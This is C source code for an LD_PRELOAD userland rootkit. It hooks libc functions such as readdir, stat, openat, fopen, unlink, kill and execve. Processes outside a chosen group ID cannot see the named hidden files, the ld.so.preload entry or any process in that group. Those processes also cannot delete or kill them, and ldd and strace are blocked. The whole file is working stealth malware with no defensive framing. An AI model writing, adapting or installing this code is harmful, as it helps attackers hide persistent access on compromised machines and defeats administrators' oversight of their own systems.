#define _GNU_SOURCE
#include <config.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pcap.h>

// for internal use

struct dirent *(*__o_readdir)(DIR *);
struct dirent *__readdir(DIR *p) {
#ifdef VERBOSE
    printf("readdir called\n");
#endif
    if(!__o_readdir)
        __o_readdir = dlsym(RTLD_NEXT, "readdir");

    return __o_readdir(p);
}

// for internal use

DIR *(*__o_opendir)(const char *);
DIR *__opendir(const char *name) {
#ifdef VERBOSE
    printf("opendir called\n");
#endif
    if(!__o_opendir)
        __o_opendir = dlsym(RTLD_NEXT, "opendir");

    return __o_opendir(name);
}

int good_gid() {
    gid_t gid = getgid();
    if (gid == GID) {
        return 1;
    }
    return 0;
}

int pid_to_gid(int pid) {
    char path[1024];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    int gid = -1;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "Gid:", 4) == 0) {
            if (sscanf(line, "Gid: %d", &gid) == 1) {
                break;
            }
            break;
        }
    }

    fclose(fp);

    return gid;
}

// EXECVE

int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {
#ifdef VERBOSE
	printf("execve called\n");
#endif
    if(!o_execve)
        o_execve = dlsym(RTLD_NEXT, "execve");

    if (good_gid() == 1) {
        return o_execve(path, argv, envp);
    }

    if (strcmp(path, HIDDEN_EXEC_PATH) == 0) {
        return -1;
    }

    // if executing ldd return -1
    if (argv[0] != NULL && strcmp(argv[0], "ldd") == 0
    || argv[0] != NULL && strcmp(argv[0], "strace") == 0
    ) {
        return -1;
    }

    return o_execve(path, argv, envp);
}

// READDIR

struct dirent *(*o_readdir)(DIR *);
struct dirent *readdir(DIR *p) {
#ifdef VERBOSE
    printf("readdir called\n");
#endif
    if(!o_readdir)
        o_readdir = dlsym(RTLD_NEXT, "readdir");

    if (good_gid() == 1) {
        return o_readdir(p);
    }

    struct dirent *dir = o_readdir(p);

    if (dir == NULL) {
        return NULL;
    }

    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
        // hide file
        return readdir(p);
    }

    return dir;
}

// READDIR64

struct dirent64 *(*o_readdir64)(DIR *);
struct dirent64 *readdir64(DIR *p) {
#ifdef VERBOSE
    printf("readdir64 called\n");
#endif
    if(!o_readdir64)
        o_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    if (good_gid() == 1) {
        return o_readdir64(p);
    }

    struct dirent64 *dir = o_readdir64(p);
    if (dir == NULL) {
        return NULL;
    }

    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
        return readdir64(p);
    }

    return dir;
}

// UNLINK

int (*o_unlink)(const char *);
int unlink(const char *pathname) {
#ifdef VERBOSE
    printf("unlink called\n");
#endif
    if(!o_unlink)
        o_unlink = dlsym(RTLD_NEXT, "unlink");

    if (good_gid() == 1) {
        return o_unlink(pathname);
    }

    if (
        strcmp(pathname, "ld.so.preload") == 0 
        || strcmp(pathname, HIDDEN_FILENAME) == 0
        || strcmp(pathname, HIDDEN_FILENAME2) == 0
    ) {
        return 0;
    }

    return o_unlink(pathname);
}

// UNLINKAT

int (*o_unlinkat)(int, const char *, int);
int unlinkat(int dirfd, const char * pathname, int flags) {
#ifdef VERBOSE
    printf("unlinkat called\n");
#endif
    if(!o_unlinkat)
        o_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

    if (good_gid() == 1) {
        return o_unlinkat(dirfd, pathname, flags);
    }

    if (
        strcmp(pathname, "ld.so.preload") == 0 
        || strcmp(pathname, HIDDEN_FILENAME2) == 0
        || strcmp(pathname, HIDDEN_FILENAME) == 0
    ) {
        return 0;
    }

    return o_unlinkat(dirfd, pathname, flags);
}

// WRITE
ssize_t (*o_write)(int, const void *, size_t);
ssize_t write(int fd, const void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("write called\n");
#endif
    if(!o_write)
        o_write = dlsym(RTLD_NEXT, "write");

    if (good_gid() == 1) {
        return o_write(fd, xbuf, count);
    }

    if (fd == 1) {
        char *buf = (char *) xbuf;
        if (
            strstr(buf, HIDDEN_FILENAME) != NULL 
        || strstr(buf, HIDDEN_FILENAME2) != NULL
        || strstr(buf, HIDDEN_EXEC_PATH) != NULL
        || strstr(buf, HIDDEN_PATH) != NULL
        ) {
            return count;
        }
    }

    if (fd == 3) {
        // save it to a log file
        // TODO
        printf("write to log file\n");
        printf("%s\n", (char *) xbuf	);
    }

    return o_write(fd, xbuf, count);
}

// READ

ssize_t (*o_read)(int, void *, size_t);
ssize_t read(int fd, void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("read called\n");
#endif
    if(!o_read)
        o_read = dlsym(RTLD_NEXT, "read");

    if (good_gid() == 1) {
        return o_read(fd, xbuf, count);
    }

    // dont allow reading of hidden files
    char *buf = (char *) xbuf;
    if (
        strstr(buf, HIDDEN_FILENAME) != NULL
    || strstr(buf, HIDDEN_FILENAME2) != NULL
    || strstr(buf, HIDDEN_EXEC_PATH) != NULL
    || strstr(buf, HIDDEN_PATH) != NULL
    ) {
        return 0;
    }

    return o_read(fd, xbuf, count);
}

int (*o_kill)(pid_t, int);
int kill(pid_t pid, int sig) {
#ifdef VERBOSE
    printf("kill called\n");
#endif
    if(!o_kill)
        o_kill = dlsym(RTLD_NEXT, "kill");

    if (good_gid() == 1) {
        return o_kill(pid, sig);
    }

    int gid = pid_to_gid(pid);

    if (gid == GID) {
        return -1;
    }

    return o_kill(pid, sig);
}

// openat

int (*o_openat)(int, const char *, int, ...);
int openat(int dirfd, const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat called\n");
#endif
    if(!o_openat)
        o_openat = dlsym(RTLD_NEXT, "openat");

    if (good_gid() == 1) {
        return o_openat(dirfd, path, flags);
    }

    // check if the file is hidden if so return -1
    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
        return -1;
    }

    if (strstr(path, "/proc/") != NULL) {
        // if the file is in /proc/ check if the gid is the same as the one we want to hide
        int pid = atoi(path + 6);
        int gid = pid_to_gid(pid);

        if (gid == GID) {
            return -1;
        }
    }

    return o_openat(dirfd, path, flags);
}

// openat64

int (*o_openat64)(int, const char *, int, ...);
int open64(const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat64 called\n");
#endif
    if(!o_openat64)
        o_openat64 = dlsym(RTLD_NEXT, "openat64");

    if (good_gid() == 1) {
        return o_openat64(AT_FDCWD, path, flags);
    }

    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
        return -1;
    }

    if (strstr(path, "/proc/") != NULL) {
        int pid = atoi(path + 6);
        int gid = pid_to_gid(pid);

        if (gid == GID) {
            return -1;
        }
    }

    return o_openat64(AT_FDCWD, path, flags);
}

// fopen

FILE *(*o_fopen)(const char *, const char *);
FILE *fopen(const char *path, const char *mode) {
#ifdef VERBOSE
    printf("fopen called\n");
#endif
    if(!o_fopen)
        o_fopen = dlsym(RTLD_NEXT, "fopen");

    if (good_gid() == 1) {
        return o_fopen(path, mode);
    }

    if (strcmp(path, "ld.so.preload") == 0 || strcmp(path, HIDDEN_FILENAME) == 0 || strcmp(path, HIDDEN_FILENAME2) == 0) {
        return NULL;
    }

    return o_fopen(path, mode);
}

// opendir

DIR *(*o_opendir)(const char *);
DIR *opendir(const char *name) {
#ifdef VERBOSE
    printf("opendir called\n");
#endif
    if(!o_opendir)
        o_opendir = dlsym(RTLD_NEXT, "opendir");

    if (good_gid() == 1) {
        return o_opendir(name);
    }

    if (strcmp(name, "ld.so.preload") == 0 || strcmp(name, HIDDEN_FILENAME) == 0 || strcmp(name, HIDDEN_FILENAME2) == 0) {
        return NULL;
    }

    // get name of current directory using getcwd
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    // check if the directory is in /proc/
    if (strstr(cwd, "/proc/") != NULL) {
        int pid = atoi(cwd + 6);
        int gid = pid_to_gid(pid);

        if (gid == GID) {
            return NULL;
        }
    }

    return o_opendir(name);
}

// stat

int (*o_stat)(const char *, struct stat *);
int stat(const char *pathname, struct stat *statbuf) {
#ifdef VERBOSE
    printf("stat called\n");
#endif
    if(!o_stat)
        o_stat = dlsym(RTLD_NEXT, "stat");

    if (good_gid() == 1) {
        return o_stat(pathname, statbuf);
    }

    if (strcmp(pathname, "ld.so.preload") == 0 || strcmp(pathname, HIDDEN_FILENAME) == 0 || strcmp(pathname, HIDDEN_FILENAME2) == 0) {
        return -1;
    }

    if (strstr(pathname, "/proc/") != NULL) {
        int pid = atoi(pathname + 6);
        int gid = pid_to_gid(pid);

        if (gid == GID) {
            return -1;
        }
    }

    return o_stat(pathname, statbuf);
}